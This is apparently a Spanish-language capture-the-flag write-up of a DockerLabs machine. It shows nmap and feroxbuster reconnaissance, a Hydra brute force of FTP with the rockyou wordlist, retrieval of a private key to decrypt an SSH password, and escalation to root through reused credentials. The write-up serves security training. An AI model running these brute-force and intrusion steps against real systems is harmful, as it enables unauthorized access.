# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/5dd59ce0-9e3d-44de-aa61-48eb411d6e48)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **21/tcp(FTP):** vsftpd 2.0.8 
2.  **22/tcp(SSH):** OpenSSH 9.6
3. **80/tcp(HTTP):** Apache httpd 2.4.58

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Encontramos un mensaje de bienvenida a `mwheeler`.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/64d69459-4b42-4105-81a3-6dae5975ddda)

# Fase 2- Exploración

#### feroxbuster
```python
❯ feroxbuster --url http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,sh,html,txt

301      GET        9l       28w      310c http://172.17.0.2/strange
200      GET        1l        1w      123c http://172.17.0.2/strange/private.txt
200      GET        9l       25w      172c http://172.17.0.2/strange/secret.html
```
Encontramos la pagina `/strange` y el archivo `/strange/private.txt`

#### Strange
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/d43df210-e191-49b7-a078-7d9a8a63e1bb)
En la pagina `Strange` encontramos algunos datos que nos pueden ser de ayuda.
Usuario: `Will Bayers` o `Will`
Usuario: `Demogorgon`
Contraseña: `iloveu`

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/a1a3ba24-4caf-4c94-a964-ff39bccf6ab4)
Si ponemos el archivo `private.txt` vemos que podemos descargarlo.

#### Secret.html
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/ae431d90-9d67-4133-a495-3a85aede7b2c)

Si nos dirigimos al archivo `/strange/secret.html` vemos que nos dice que el usuario del servicio `ftp` es `admin` pero que la contraseña la tenemos que descubrir, pero que el diccionario rockyou es correcto para usarlo.

# Fase 3- Explotación

#### Hydra
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/b4aa888f-018e-4969-808e-9d150b9691ea)
Y encontramos la contraseña `banana` valida para el usuario `admin` para ftp, El comando usado es:
```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://172.17.0.2
```

```python
❯ sudo ftp 172.17.0.2
Connected to 172.17.0.2.
220 Welcome to my FTP server
Name (172.17.0.2:sansett): admin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40089|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0             522 May 01 00:53 private_key.pem
226 Directory send OK.
ftp> get private_key.pem
local: private_key.pem remote: private_key.pem
229 Entering Extended Passive Mode (|||40013|)
150 Opening BINARY mode data connection for private_key.pem (522 bytes).
100% |***************************************************************************************************************************************************************|   522       22.62 MiB/s    00:00 ETA
226 Transfer complete.
522 bytes received in 00:00 (2.73 MiB/s)
```
Nos conectamos por ftp y descargamos un archivo llamado `private_key.pem`.

#### .pem
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/f82479dc-ce25-4445-9298-6b076385ec1e)

Vemos que es una especie de clave pero no es legible.

```python
❯ openssl rsautl -decrypt -in private.txt -out privateOUT.txt -inkey private_key.pem
The command rsautl was deprecated in version 3.0. Use 'pkeyutl' instead.
❯ cat privateOUT.txt
   1   │ demogorgon
```
Este comando  descifra el contenido del archivo `private.txt` usando una clave privada almacenada en `private_key.pem`. El resultado descifrado se guarda en el archivo `privateOUT.txt`. En otras palabras, convierte los datos cifrados de `private.txt` en texto claro utilizando la clave privada y guarda este texto claro en `privateOUT.txt`. Obteniendo así una clave que es `demogorgon` para el usuario `mwheeler`.

#### ssh
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/103cb860-c73f-4c4e-88a0-929bde4f74a3)

Y estamos dentro de la maquina!.

# Fase 4- Privilegios

#### sudo -l
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/fc2c965b-909d-4a83-a716-bbc842e041e6)

Despues de realizar el tratamiento de la TTY, vemos que no tenemos ningún binario que se pueda ejecutar para escalar.

#### admin
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/c6e14f40-6728-457d-a805-c859ae577e89)

Si vemos el archivo `/etc/passwd` vemos el usuario `admin` que si recordamos su contraseña para ftp era `banana`.
```python
mwheeler@13735a784678:~$ su admin
Password: 
$ whoami
admin
$ 
```
Somos el usuario admin!.

#### admin
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/b6a7fd59-f682-49a0-9a09-36239e2edbf2)
Como usuario `admin` tenemos permisos de ejecución de todo, así que hacemos un `sudo su` y ya somos usuario `root`!.
